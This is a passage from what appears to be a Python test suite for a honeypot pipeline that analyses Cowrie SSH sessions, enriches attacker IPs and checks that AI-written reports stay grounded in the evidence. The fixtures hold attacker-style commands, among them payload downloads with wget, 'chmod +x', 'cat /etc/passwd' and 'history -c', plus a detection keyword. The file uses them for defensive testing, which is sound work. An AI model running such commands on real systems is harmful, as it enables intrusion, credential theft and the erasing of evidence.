                    "confidence_damping": {"mode": "geometric_mean", "factor": 0.44},
                    "weights": {"fallback_progression": 1.0},
                    "effective_weights": {"fallback_progression": 1.0},
                    "active_weights": {"fallback_progression": 1.0},
                    "final_ranking": [
                        {
                            "tactic": "execution",
                            "score": 0.2,
                            "confidence": "low",
                            "sources": [
                                {
                                    "name": "fallback_progression",
                                    "source_type": "heuristic_prior",
                                    "weighted_score": 0.2,
                                }
                            ],
                            "reasons": ["test"],
                        }
                    ],
                    "scorer_outputs": {},
                },
            },
        }
    )
    assert "Classification quality" in html
    assert "Classifier validation baseline is missing" in html
    assert "Classification chain confidence is weak" in html


def test_no_command_session_is_skipped_without_analysis_job() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        for event in _no_command_events():
            storage.store_event(cfg.sensor_id, event)

        worker = SessionWorker(cfg)
        assert worker.process_unprocessed() == 3

        sessions = storage.list_rows("sessions")
        assert len(sessions) == 1
        payload = json.loads(sessions[0]["payload_json"])
        assert payload["session_id"] == "sess-empty"
        assert payload["is_ended"] is True
        assert payload["session_outcome"] == "scanner_no_command"
        assert payload["analysis_status"] == "skipped"
        assert payload["analysis_skip_reason"] == "no_commands"
        assert payload["raw_events"][1]["password"] == "[REDACTED]"
        assert "bad-pass" not in json.dumps(payload)

        jobs = storage.list_rows("analysis_jobs")
        assert jobs == []


def test_analysis_worker_stores_report_with_provenance() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        for event in _demo_events():
            storage.store_event(cfg.sensor_id, event)

        SessionWorker(cfg).process_unprocessed()
        storage.save_enrichment_record(
            "ip",
            "8.8.8.8",
            {
                "asn": "AS15169 Google LLC",
                "country": "US",
                "isp": "Google",
                "raw_otx_pulse": "Cached enrichment test pulse",
                "otx_tags": ["scanner"],
            },
            {"static": {"status": "ok"}},
            expires_at="2099-01-01T00:00:00+00:00",
        )
        processed = asyncio.run(AnalysisWorker(cfg).process_once(coordinator_class=FakeCoordinator))
        assert processed == 1

        reports = storage.list_rows("reports")
        assert len(reports) == 1
        report = json.loads(reports[0]["payload_json"])
        assert report["session_id"] == "sess-1"
        assert report["raw_event_count"] == 4
        assert report["data_provenance"]["session"]["raw_event_count"] == 4
        assert report["data_provenance"]["session"]["command_input_count"] == 1
        assert report["data_provenance"]["session"]["successful_command_count"] == 1
        assert report["data_provenance"]["session"]["failed_command_count"] == 0
        assert report["data_provenance"]["session"]["unknown_command_outcome_count"] == 0
        assert report["data_provenance"]["session"]["command_outcome_observed"] is True
        assert report["data_provenance"]["credential_metadata"]["raw_password_stored"] is False
        assert report["data_provenance"]["enrichment"]["status"] == "applied"
        assert report["data_provenance"]["behavior_graph"]["bpg_count"] >= 1
        assert Path(report["artifacts"]["json"]).exists()
        assert Path(report["artifacts"]["stix"]).exists()

        jobs = storage.list_rows("analysis_jobs")
        assert jobs[0]["status"] == "succeeded"


def test_analysis_report_marks_command_outcomes_unknown_without_cowrie_success_metadata() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        for event in _demo_events_without_command_outcome():
            storage.store_event(cfg.sensor_id, event)

        SessionWorker(cfg).process_unprocessed()
        processed = asyncio.run(AnalysisWorker(cfg).process_once(coordinator_class=FakeCoordinator))
        assert processed == 1

        report = json.loads(storage.list_rows("reports")[0]["payload_json"])
        session_provenance = report["data_provenance"]["session"]
        assert session_provenance["command_count"] == 1
        assert session_provenance["command_input_count"] == 1
        assert session_provenance["successful_command_count"] is None
        assert session_provenance["failed_command_count"] is None
        assert session_provenance["unknown_command_outcome_count"] == 1
        assert session_provenance["command_outcome_observed"] is False
        assert "command.input" in session_provenance["command_outcome_semantics"]


def test_attack_timeline_deduplicates_duplicate_login_success_events() -> None:
    raw_events = [
        {
            "eventid": "cowrie.login.success",
            "timestamp": "2026-07-11T22:53:29.103388Z",
            "src_ip": "192.0.2.78",
            "username": "codexlive13",
            "password": "[REDACTED]",
            "password_hash": "sha256:abc",
        },
        {
            "eventid": "cowrie.login.success",
            "timestamp": "2026-07-11T22:53:29.104848Z",
            "src_ip": "192.0.2.78",
            "username": "codexlive13",
        },
        {
            "eventid": "cowrie.session.file_download",
            "timestamp": "2026-07-11T22:53:31.000000Z",
            "src_ip": "192.0.2.78",
            "url": "http://example.invalid/a.sh",
            "outfile": "/tmp/a.sh",
            "shasum": "a" * 64,
        },
    ]

    timeline = _build_attack_timeline(raw_events)
    assert len(timeline["key_events"]) == 2
    assert timeline["key_events"][0]["event"].startswith("Successful login")
    assert "codexlive13" not in json.dumps(timeline, sort_keys=True)
    assert "[REDACTED]" in timeline["key_events"][0]["event"]
    assert timeline["key_events"][1]["event"].startswith("File downloaded")


def test_analysis_worker_skips_legacy_no_command_job_without_retry() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        payload = {
            "session_id": "legacy-empty",
            "src_ip": "198.51.100.45",
            "start_time": "2026-05-12T00:00:00Z",
            "is_ended": True,
            "login_success": False,
            "commands": [],
            "raw_events": [
                {
                    "eventid": "cowrie.session.closed",
                    "session": "legacy-empty",
                    "src_ip": "198.51.100.45",
                    "timestamp": "2026-05-12T00:00:01Z",
                }
            ],
        }
        storage.enqueue_analysis_job(payload)

        processed = asyncio.run(AnalysisWorker(cfg).process_once(coordinator_class=FakeCoordinator))
        assert processed == 1

        jobs = storage.list_rows("analysis_jobs")
        assert len(jobs) == 1
        assert jobs[0]["status"] == "skipped"
        assert jobs[0]["error"] == "no_commands"
        assert storage.list_rows("reports") == []


def test_analysis_worker_writes_deterministic_fallback_report() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        for event in _demo_events():
            storage.store_event(cfg.sensor_id, event)

        SessionWorker(cfg).process_unprocessed()
        processed = asyncio.run(AnalysisWorker(cfg).process_once(coordinator_class=FailingCoordinator))
        assert processed == 1

        reports = storage.list_rows("reports")
        assert len(reports) == 1
        report = json.loads(reports[0]["payload_json"])
        assert report["analysis_mode"] == "deterministic_fallback"
        assert report["data_provenance"]["ai"]["fallback"] == "deterministic_baseline"
        assert report["error"] == "RuntimeError: operation_failed"
        assert Path(report["artifacts"]["json"]).exists()


def test_analysis_worker_resolves_job_when_fallback_redaction_fails(
    monkeypatch,
    capsys,
) -> None:
    secret = "fallback-redaction-secret"
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        for event in _demo_events():
            storage.store_event(cfg.sensor_id, event)
        SessionWorker(cfg).process_unprocessed()

        def fail_redaction(_value):
            raise RuntimeError(f"Authorization: Bearer {secret}")

        monkeypatch.setattr(
            "production.workers.analysis_worker.redact_for_artifact",
            fail_redaction,
        )
        processed = asyncio.run(
            AnalysisWorker(cfg).process_once(
                coordinator_class=FailingCoordinator,
            )
        )

        assert processed == 0
        jobs = storage.list_rows("analysis_jobs")
        assert len(jobs) == 1
        assert jobs[0]["status"] == "failed"
        assert jobs[0]["error"] == "job_invalid:ValidationError"
        assert jobs[0]["last_error_code"] == "job_invalid"
        assert jobs[0]["last_error_type"] == "ValidationError"
        assert secret not in jobs[0]["error"]
        assert storage.list_rows("reports") == []
        assert secret not in capsys.readouterr().out


def test_closed_session_report_exposes_threat_hunting_correlation_context() -> None:
    report = deterministic_baseline_report(
        {
            "session_id": "hunt-context-1",
            "src_ip": "203.0.113.88",
            "commands": ["wget http://x/payload.sh -O /tmp/a"],
            "ttps": ["T1105"],
            "classification_events": [
                {
                    "command": "wget http://x/payload.sh -O /tmp/a",
                    "ttp": "T1105",
                    "tactic": "command-and-control",
                    "source": "rule",
                    "confidence": 1.0,
                }
            ],
            "raw_events": [{"eventid": "cowrie.command.input", "input": "wget http://x/payload.sh -O /tmp/a"}],
            "session_ttp_correlations": [
                {
                    "session_id": "hunt-context-1",
                    "correlation_id": "corr-1",
                    "rule_id": "cowrie-file-transfer-correlates-t1105",
                    "ttp": "T1105",
                    "source_ttp": "T1105",
                    "tactic": "command-and-control",
                    "technique_name": "Ingress Tool Transfer",
                    "source_type": "human_curated_attck_detection",
                    "confidence": 0.78,
                    "evidence_type": "session_correlated_candidate",
                    "temporal_claim": False,
                    "apply_to_prediction": True,
                    "reason": "file transfer command and Cowrie download telemetry both observed",
                    "evidence": [
                        {"type": "command", "command": "wget http://x/payload.sh -O /tmp/a"},
                        {"type": "raw_event", "eventid": "cowrie.session.file_download", "outfile": "payload"},
                    ],
                    "matched_conditions": [],
                    "references": [{"name": "MITRE ATT&CK T1105", "url": "https://attack.mitre.org/techniques/T1105/"}],
                    "provenance": {"method": "unit-test", "basis": ["session pattern"]},
                }
            ],
        },
        "unit fallback",
        prediction_snapshot={
            "snapshot_id": "predsnap-unit",
            "generated_at": "2026-05-25T00:00:00Z",
            "final_ranking": [
                {
                    "tactic": "execution",
                    "confidence": "low",
                    "score": 0.42,
                    "source_types": ["heuristic_prior"],
                    "reasons": ["download then execute is plausible"],
                    "sources": [{"name": "tactic_combination", "source_type": "heuristic_prior"}],
                }
            ],
            "trust_status": {"status": "review_required"},
        },
    )
    context = report["threat_hunting_context"]
    finding = context["session_correlations"][0]
    assert context["session_id"] == "hunt-context-1"
    assert context["correlation_rules_fired"] == ["cowrie-file-transfer-correlates-t1105"]
    assert finding["predicted_technique"]["main_ttp"] == "T1105"
    assert finding["main_ttp"] == "T1105"
    assert finding["source_type"] == "human_curated_attck_detection"
    assert finding["confidence"] == 0.78
    assert any("wget" in item for item in finding["evidence"])
    assert report["session_correlations"][0]["rule_id"] == "cowrie-file-transfer-correlates-t1105"
    assert report["correlation_rules_fired"] == ["cowrie-file-transfer-correlates-t1105"]
    layers = report["threat_evidence_layers"]
    assert layers["direct_command_ttps"]["items"][0]["main_ttp"] == "T1105"
    assert layers["session_correlated_ttps"]["items"][0]["main_ttp"] == "T1105"
    assert layers["prediction_only_hypotheses"]["items"][0]["predicted_tactic"] == "execution"
    assert layers["prediction_only_hypotheses"]["items"][0]["source_types"] == ["heuristic_prior"]
    assert report["threat_hypothesis"]["evidence_layer_summary"]["direct_command_ttp_count"] == 1


def test_webhook_dispatcher_noops_without_url() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        assert WebhookDispatcher(cfg).dispatch_once() == 0


def test_webhook_dispatcher_honors_max_attempts() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.webhook_url = "http://127.0.0.1:9"
        cfg.webhook_allowed_schemes = ["http"]
        cfg.webhook_allow_private_networks = True
        cfg.webhook_max_attempts = 1
        storage = open_storage(cfg.database_url)
        alert = {
            "alert_id": "alert-1",
            "session_id": "sess-1",
            "severity": "HIGH",
            "reason": "test",
        }
        storage.store_alert(alert)
        storage.record_webhook_delivery(
            {"type": "alert", "alert": alert, "timestamp": "2026-05-12T00:00:00Z"},
            target_hash(cfg.webhook_url),
            "failed",
            error="previous failure",
            alert_id="alert-1",
        )
        assert WebhookDispatcher(cfg).dispatch_once() == 0


def test_webhook_dispatcher_sends_medium_threat_hunt_matches_only() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.webhook_url = "http://127.0.0.1:9"
        cfg.webhook_allowed_schemes = ["http"]
        cfg.webhook_allow_private_networks = True
        storage = open_storage(cfg.database_url)
        storage.store_alert(
            {
                "alert_id": "alert-medium-generic",
                "session_id": "sess-1",
                "severity": "MEDIUM",
                "reason": "generic medium should stay dashboard-only",
                "alert_type": "generic_medium",
            }
        )
        storage.store_alert(
            {
                "alert_id": "alert-medium-threat-hunt",
                "session_id": "sess-2",
                "severity": "MEDIUM",
                "reason": "active related session matched confirmed IOC",
                "alert_type": "threat_hunt_match",
            }
        )
        assert WebhookDispatcher(cfg).dispatch_once() == 1
        deliveries = storage.list_rows("webhook_deliveries", limit=10)
        assert len(deliveries) == 2
        by_alert = {delivery["alert_id"]: delivery for delivery in deliveries}
        assert by_alert["alert-medium-generic"]["status"] == "filtered"
        assert by_alert["alert-medium-threat-hunt"]["status"] == "retryable"


def test_feed_stale_cache_fallback_and_kev_rescan() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        cisa_cache = root / "cisa_kev_cache.json"
        sigma_cache = root / "sigma_rules_cache.json"
        cisa_cache.write_text(
            json.dumps(
                {
                    "_schema": feeds_module.CACHE_SCHEMA_VERSION,
                    "_fetched": "2020-01-01T00:00:00+00:00",
                    "catalog_version": "test-catalog",
                    "entries": {
                        "CVE-2024-12345": {
                            "vendor": "ExampleVendor",
                            "product": "ExampleProduct",
                            "name": "Example exploited vulnerability",
                            "date_added": "2026-05-12",
                            "description": "Used by the local test suite.",
                            "required_action": "Patch ExampleProduct.",
                            "due_date": "2026-06-01",
                        }
                    },
                }
            ),
            encoding="utf-8",
        )
        sigma_cache.write_text(
            json.dumps(
                {
                    "_schema": feeds_module.CACHE_SCHEMA_VERSION,
                    "_fetched": "2020-01-01T00:00:00+00:00",
                    "rules": {
                        "sigma-test-rule": {
                            "title": "Suspicious SSH Downloader",
                            "status": "test",
                            "level": "high",
                            "tags": ["attack.t1105"],
                            "keywords": ["wget -q"],
                            "logsource": {"product": "linux"},
                        }
                    },
                }
            ),
            encoding="utf-8",
        )

        old_cisa_fetch = feeds_module._fetch_cisa_kev
        old_sigma_fetch = feeds_module._fetch_sigma_rules
        try:
            feeds_module._fetch_cisa_kev = lambda: None
            feeds_module._fetch_sigma_rules = lambda: None
            kev = feeds_module.load_cisa_kev(cache_path=str(cisa_cache))
            sigma = feeds_module.load_sigma_rules(cache_path=str(sigma_cache))
        finally:
            feeds_module._fetch_cisa_kev = old_cisa_fetch
            feeds_module._fetch_sigma_rules = old_sigma_fetch

        feeds = feeds_module.ThreatFeedDB(kev, sigma)
        assert feeds.is_actively_exploited("CVE-2024-12345") is True
        assert "wget -q" in feeds.get_keywords_for_level("high")

        hits = feeds_module.scan_history_for_new_kev(
            [
                {
                    "session_id": "historic-session",
                    "src_ip": "203.0.113.50",
                    "commands": ["curl http://host/exploit?cve=CVE-2024-12345"],
                }
            ],
            feeds,
        )
        assert hits[0]["session_id"] == "historic-session"
        assert hits[0]["cve_id"] == "CVE-2024-12345"


def test_enrichment_worker_normalizes_and_caches_provider_results() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        cfg.enrichment_ttl_seconds = 3600
        storage = open_storage(cfg.database_url)
        job_id, queued = storage.enqueue_enrichment_job(
            "ip",
            "8.8.4.4",
            session_id="enrich-session",
            payload={"source": "unit-test"},
        )
        assert job_id
        assert queued is True

        provider = StaticProvider(
            {
                ("ip", "8.8.4.4"): {
                    "raw_otx_pulse": "Unit Test OTX Pulse",
                    "otx_tags": ["ssh-bruteforce", "scanner"],
                    "asn": "AS15169 Google LLC",
                    "country": "US",
                    "isp": "Google",
                    "open_ports": [53],
                    "infrastructure_tags": ["scanner"],
                    "vt_hit": True,
                    "vt_detection_ratio": "2/70",
                    "vt_malware_family": "UnitTest.Family",
                }
            },
            ttl_seconds=3600,
        )
        processed = EnrichmentWorker(cfg, providers=[provider]).process_once()
        assert processed == 1

        record = storage.get_enrichment_record("ip", "8.8.4.4", allow_stale=False)
        assert record is not None
        payload = record["payload"]
        assert payload["raw_otx_pulse"] == "Unit Test OTX Pulse"
        assert payload["vt_hit"] is True
        assert payload["provider_status"]["static"]["status"] == "ok"
        assert record["is_stale"] is False

        cache = storage.load_enrichment_cache("ip", allow_stale=False)
        assert cache["8.8.4.4"]["asn"] == "AS15169 Google LLC"

        _, queued_again = storage.enqueue_enrichment_job("ip", "8.8.4.4")
        assert queued_again is False
        jobs = storage.list_rows("enrichment_jobs")
        assert jobs[0]["status"] == "succeeded"


def test_enrichment_jobs_claim_urgent_priority_first() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.enqueue_enrichment_job("ip", "203.0.113.10", session_id="normal-session")
        storage.enqueue_enrichment_job(
            "ip",
            "203.0.113.11",
            session_id="urgent-session",
            priority="urgent",
            priority_reason="unit predictive alert",
        )

        jobs = storage.claim_enrichment_jobs("priority-test", 2, 30, 3)
        assert [job["observable_value"] for job in jobs] == ["203.0.113.11", "203.0.113.10"]
        assert jobs[0]["priority"] == "urgent"
        assert jobs[0]["priority_reason"] == "unit predictive alert"


def test_reprioritize_enrichment_job_keeps_highest_priority() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        cfg = _config(tmp)
        storage = open_storage(cfg.database_url)
        storage.enqueue_enrichment_job("ip", "203.0.113.12", session_id="priority-session")
        updated = storage.reprioritize_enrichment_jobs(
            "203.0.113.12",
            priority="urgent",
            reason="predictive alert unit",
            session_id="priority-session",
        )
        assert updated == 1
        storage.enqueue_enrichment_job("ip", "203.0.113.12", session_id="priority-session", priority="normal")
        job = storage.list_rows("enrichment_jobs")[0]
        assert job["priority"] == "urgent"
        assert job["priority_reason"] == "predictive alert unit"


def test_censys_platform_token_config_and_normalization() -> None:
    env_keys = ["CENSYS_PLATFORM_TOKEN", "CENSYS_ORGANIZATION_ID"]
    previous = {key: os.environ.get(key) for key in env_keys}
    try:
        os.environ["CENSYS_PLATFORM_TOKEN"] = "censys_unit_test_token"
        os.environ["CENSYS_ORGANIZATION_ID"] = "11111111-2222-3333-4444-555555555555"
        cfg = ProductionConfig.from_env()
        assert cfg.censys_platform_token == "censys_unit_test_token"
        assert cfg.censys_organization_id == "11111111-2222-3333-4444-555555555555"
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value

    provider = CensysProvider(
        platform_token="censys_unit_test_token",
        organization_id="11111111-2222-3333-4444-555555555555",
    )
    captured = {}

    def fake_json_get(url, headers=None):
        captured["url"] = url
        captured["headers"] = headers or {}
        return {
            "result": {
                "resource": {
                    "ip": "1.1.1.1",
                    "location": {"country_code": "AU"},
                    "autonomous_system": {"asn": 13335, "name": "CLOUDFLARENET"},
                    "labels": [{"value": "PUBLIC_DNS"}],
                    "services": [
                        {
                            "service_name": "SSH",
                            "transport_protocol": "TCP",
                            "port": 22,
                            "labels": [{"value": "REMOTE_ACCESS"}],
                        }
                    ],
                }
            }
        }

    provider._json_get = fake_json_get  # type: ignore[method-assign]
    result = provider.enrich("ip", "1.1.1.1")
    assert result.status == "ok"
    assert captured["url"].startswith("https://api.platform.censys.io/v3/global/asset/host/1.1.1.1")
    assert "organization_id=11111111-2222-3333-4444-555555555555" in captured["url"]
    assert captured["headers"]["Authorization"] == "Bearer censys_unit_test_token"
    assert captured["headers"]["User-Agent"] == "honeypot-censys-enrichment/1.0"

    payload, provider_status, _ = merge_provider_results("ip", "1.1.1.1", [result])
    assert provider_status["censys"]["status"] == "ok"
    assert payload["censys_api"] == "platform"
    assert payload["country"] == "AU"
    assert payload["asn"] == 13335
    assert payload["isp"] == "CLOUDFLARENET"
    assert payload["open_ports"] == [22]
    assert "SSH 22/TCP" in payload["running_services"]
    assert "PUBLIC_DNS" in payload["censys_labels"]
    assert "REMOTE_ACCESS" in payload["censys_labels"]


def test_shodan_provider_falls_back_to_internetdb() -> None:
    provider = ShodanProvider(api_key="oss_plan_key")
    captured = []

    def fake_json_get(url, headers=None):
        captured.append((url, headers or {}))
        if "api.shodan.io/shodan/host" in url:
            raise urllib.error.HTTPError(url, 403, "Forbidden", hdrs=None, fp=None)
        assert "internetdb.shodan.io/198.51.100.45" in url
        return {
            "ip": "198.51.100.45",
            "ports": [80, 10045],
            "hostnames": ["tor-exit.example"],
            "cpes": ["cpe:/a:nginx:nginx"],
            "tags": ["proxy"],
            "vulns": ["CVE-2020-0001"],
        }

    provider._json_get = fake_json_get  # type: ignore[method-assign]
    result = provider.enrich("ip", "198.51.100.45")
    assert result.status == "ok"
    assert result.data["_shodan_api"] == "internetdb"
    assert result.data["_shodan_primary_error"] == "OSError: operation_failed"
    assert captured[1][1]["User-Agent"] == "honeypot-shodan-internetdb/1.0"

    payload, provider_status, _ = merge_provider_results("ip", "198.51.100.45", [result])
    assert provider_status["shodan"]["status"] == "ok"
    assert payload["shodan_api"] == "internetdb"
    assert payload["open_ports"] == [80, 10045]
    assert payload["shodan_tags"] == ["proxy"]
    assert payload["shodan_hostnames"] == ["tor-exit.example"]
    assert payload["shodan_cpes"] == ["cpe:/a:nginx:nginx"]
    assert payload["shodan_vulns"] == ["CVE-2020-0001"]


def test_unconfigured_provider_uses_short_retry_ttl() -> None:
    result = ShodanProvider(api_key="", ttl_seconds=86400).enrich("ip", "8.8.8.8")
    assert result.status == "not_configured"
    assert result.ttl_seconds == 3600


def test_monitor_extracts_report_recommendations() -> None:
    report = {
        "recommended_mitigations": ["Review downloaded payloads in an isolated sandbox."],
        "recommended_actions_structured": [
            {
                "action_id": "review-payload",
                "action": "Review downloaded payloads in an isolated sandbox.",
                "why": "Payload transfer was observed.",
                "rule_id": "payload-download-response",
                "severity": "high",
                "confidence": "high",
                "source_type": "trusted_control_guidance",
                "evidence": ["observed tactic matched command-and-control"],
                "references": [{"name": "MITRE ATT&CK T1105", "url": "https://attack.mitre.org/techniques/T1105/"}],
                "automation_safety": {
                    "level": "manual_approval_required",
                    "safe_to_auto_execute": False,
                    "requires_manual_approval": True,
                    "rationale": "Manual review is required before response.",
                },
                "requires_manual_approval": True,
                "authority": "trusted_policy_engine",
                "approved_by_policy": True,
                "recommendation_tier": "trusted_recommendation",
                "provenance": {
                    "authority": "trusted_policy_engine",
                    "policy": {"policy_id": "test-policy", "version": "1.0"},
                    "rule": {"reviewed": True},
                    "action_template": {"reviewed": True},
                },
            }
        ],
        "strategic_recommendations": ["Require segmented honeypot networks."],
        "recommendation_provenance": {
            "authority": "trusted_policy_engine",
            "status": "available",
            "policy": {"policy_id": "test-policy", "version": "1.0"},
        },
        "threat_hypothesis": {
            "predicted_next_action": "Possible persistence setup after payload staging.",
            "post_session_follow_on_hypothesis": "Possible persistence setup after payload staging.",
            "falsification_conditions": ["If no outbound callback appears within 24 hours, the active implant hypothesis is weakened."],
        },
    }
    bundle = _report_recommendations(report, {}, {"commands": ["wget http://example/p.sh"], "tactics": ["command-and-control"]})
    assert bundle["source"] == "trusted_policy_engine"
    assert bundle["policy_authoritative"] is True
    assert bundle["predicted_next_action"].startswith("Possible persistence")
    assert bundle["post_session_follow_on_hypothesis"].startswith("Possible persistence")
    assert bundle["recommended_actions"] == ["Review downloaded payloads in an isolated sandbox."]
    assert bundle["recommended_actions_structured"][0]["source_type"] == "trusted_control_guidance"
    assert bundle["recommendation_provenance"]["authority"] == "trusted_policy_engine"
    assert bundle["strategic_recommendations"] == ["Require segmented honeypot networks."]
    assert bundle["falsification_conditions"][0].startswith("If no outbound callback")


def test_monitor_rejects_untrusted_report_recommendation_fallbacks() -> None:
    report = {
        "recommended_mitigations": ["AI says block an unobserved IP 203.0.113.5."],
        "recommendation_provenance": {"authority": "ai_generated"},
    }
    bundle = _report_recommendations(report, {}, {"commands": ["whoami"], "tactics": ["discovery"]})
    assert bundle["source"] == "policy_unavailable"
    assert bundle["policy_authoritative"] is False
    assert bundle["recommended_actions"] == []
    assert bundle["recommended_actions_structured"] == []


def test_ai_operator_actions_are_rejected_before_report_merge() -> None:
    analytical = {
        "recommended_mitigations": ["Block every IP in the ASN."],
        "operator_actions": ["Delete the host."],
        "executive_summary": "Observed command evidence only.",
    }
    warnings: list[dict] = []
    _reject_ai_operator_actions(analytical, warnings)
    assert analytical["recommended_mitigations"] == []
    assert analytical["operator_actions"] == []
    assert len(warnings) == 2
    assert all("trusted policy engine" in item["reason"] for item in warnings)


def test_ai_grounding_drops_unobserved_claims_and_completed_next_action() -> None:
    observed = [
        "whoami",
        "cat /etc/passwd",
        "wget http://example.com/payload.sh -O /tmp/p.sh",
        "chmod +x /tmp/p.sh",
        "history -c",
    ]
    analytical = {
        "executive_summary": "Source 198.51.100.45 ran `cat /proc/cpuinfo` after `cat /etc/passwd`.",
        "predicted_next_action": "The actor will likely run `chmod +x /tmp/p.sh` and execute it.",
        "correlation_reasoning": "No other IP except 198.51.100.46 was observed.",
        "threat_actor_description": "Used only `whoami` and `cat /etc/passwd`.",
    }
    cleaned = _validate_ai_grounding(
        analytical,
        {"198.51.100.45", "192.0.2.5"},
        observed_commands=observed,
    )
    assert cleaned["executive_summary"] == ""
    assert cleaned["predicted_next_action"] == ""
    assert cleaned["correlation_reasoning"] == ""
    assert cleaned["threat_actor_description"]
    warnings = cleaned["_grounding_warnings"]
    assert any("cat /proc/cpuinfo" in str(item) for item in warnings)
    assert any("198.51.100.46" in str(item) for item in warnings)
    assert any("chmod/make executable already observed" in str(item) for item in warnings)


def test_ai_grounding_drops_completed_download_or_sensitive_file_claim() -> None:
    observed = [
        "cat /etc/passwd",
        "wget http://example.com/payload.sh -O /tmp/p.sh",
    ]
    download_repeat = _validate_ai_grounding(
        {
            "predicted_next_action": (
                "The actor will likely download payload from "
                "`http://example.com/payload.sh` and stage it."
            )
        },
        {"198.51.100.45"},
        observed_commands=observed,
    )
    assert download_repeat["predicted_next_action"] == ""
    assert any("download from observed URL" in str(item) for item in download_repeat["_grounding_warnings"])

    sensitive_repeat = _validate_ai_grounding(
        {"predicted_next_action": "The actor will likely read `/etc/passwd` next."},
        {"198.51.100.45"},
        observed_commands=observed,
    )
    assert sensitive_repeat["predicted_next_action"] == ""
    assert any("sensitive file access already observed" in str(item) for item in sensitive_repeat["_grounding_warnings"])


def test_ai_report_ioc_table_uses_external_urls_without_c2_claim() -> None:
    class Url:
        value = "http://example.com/payload.sh"

    class Bundle:
        urls = [Url()]
        ips = []

    table = _build_ioc_table([], Bundle(), [])
    assert table["external_urls"] == ["http://example.com/payload.sh"]
    assert table["c2_urls"] == []


def test_ai_report_download_hash_recommendation_handles_missing_url() -> None:
    class Bundle:
        urls = []
        ips = []

    recommendations = _generate_dynamic_recommendations(
        {},
        Bundle(),
        [
            {
                "eventid": "cowrie.session.file_download",
                "outfile": "var/lib/cowrie/downloads/abc123",
                "shasum": "abc123",
            }
        ],
    )
    joined = "\n".join(recommendations)
    assert "``" not in joined
    assert "source URL unavailable in event" in joined


def test_ai_report_uses_trusted_policy_recommendation_engine() -> None:
    class Session:
        session_id = "policy-report-session"
        src_ip = "198.51.100.45"
        sensor = "unit-sensor"
        protocol = "ssh"
        dst_port = 22
        login_success = True
        login_username = "root"
        commands_success = [
            "cat /etc/passwd",
            "wget http://example.com/payload.sh -O /tmp/p.sh",
            "history -c",
        ]
        commands = commands_success
        classification_events = [
            {"command": "cat /etc/passwd", "ttp": "T1003", "tactic": "credential-access", "confidence": 1.0, "source": "rule"},
            {"command": "wget http://example.com/payload.sh -O /tmp/p.sh", "ttp": "T1105", "tactic": "command-and-control", "confidence": 1.0, "source": "rule"},
            {"command": "history -c", "ttp": "T1070", "tactic": "defense-evasion", "confidence": 1.0, "source": "rule"},
        ]

    decision = _build_trusted_recommendation_decision(
        [Session()],
        [
            {
                "eventid": "cowrie.session.file_download",
                "outfile": "var/lib/cowrie/downloads/abc123",
                "shasum": "a" * 64,
                "destfile": "/tmp/p.sh",
            }
        ],
        {
            "credential-access": ["T1003"],
            "command-and-control": ["T1105"],
            "defense-evasion": ["T1070"],
        },
        {
            "T1003": ["cat /etc/passwd"],
            "T1105": ["wget http://example.com/payload.sh -O /tmp/p.sh"],
            "T1070": ["history -c"],
        },
    )
    assert decision["status"] == "available"
    assert decision["authority"] == "trusted_policy_engine"
    assert decision["immediate_actions"]
    for item in decision["immediate_actions"][:3]:
        assert item["authority"] == "trusted_policy_engine"
        assert item["approved_by_policy"] is True
        assert item.get("rule_id")
        assert item.get("severity") in {"info", "low", "medium", "high", "critical"}
        assert item.get("confidence") in {"low", "possible", "medium", "likely", "high"}
        assert item.get("source_type")
        assert item.get("evidence")
        assert item.get("references")
        assert isinstance(item.get("automation_safety"), dict)
        assert item["automation_safety"]["safe_to_auto_execute"] is False
        assert item["requires_manual_approval"] is True
        assert item["provenance"]["authority"] == "trusted_policy_engine"
    assert (decision.get("trust") or {}).get("trusted_source_count", 0) >= 1


def test_stix_bundle_exports_policy_actions_observations_sightings_and_campaign() -> None:
    report = {
        "session_id": "stix-expanded",
        "summary": "Observed payload staging and credential access.",
        "ttps": ["T1003", "T1105"],
        "ioc_summary": {
            "ips": [{"type": "ipv4", "value": "198.51.100.9", "first_seen": "2026-06-10T01:00:00Z"}],
            "urls": [{"type": "url", "value": "http://example.com/payload.sh", "first_seen": "2026-06-10T01:01:00Z"}],
            "domains": [{"type": "domain", "value": "example.com"}],
            "hashes": [{"type": "sha256", "value": "b" * 64}],
        },
        "recommended_actions_structured": [
            {
                "action_id": "block-source-ip",
                "action": "Block the observed source IP after review.",
                "why": "The source IP was observed in a high-risk honeypot session.",
                "rule_id": "source-ip-block-response",
                "severity": "high",
                "confidence": "high",
                "source_type": "trusted_control_guidance",
                "evidence": ["observed technique T1105"],
                "references": [
                    {
                        "name": "MITRE ATT&CK T1105",
                        "external_id": "T1105",
                        "url": "https://attack.mitre.org/techniques/T1105/",
                    }
                ],
                "automation_safety": {
                    "safe_to_auto_execute": False,
                    "requires_manual_approval": True,
                    "level": "manual_approval_required",
                },
                "requires_manual_approval": True,
                "approved_by_policy": True,
                "authority": "trusted_policy_engine",
                "recommendation_tier": "trusted_recommendation",
                "provenance": {
                    "authority": "trusted_policy_engine",
                    "policy": {"policy_id": "test-policy", "version": "1.0"},
                    "rule": {"reviewed": True},
                    "action_template": {"reviewed": True},
                },
            }
        ],
    }
    session_payload = {
        "session_id": "stix-expanded",
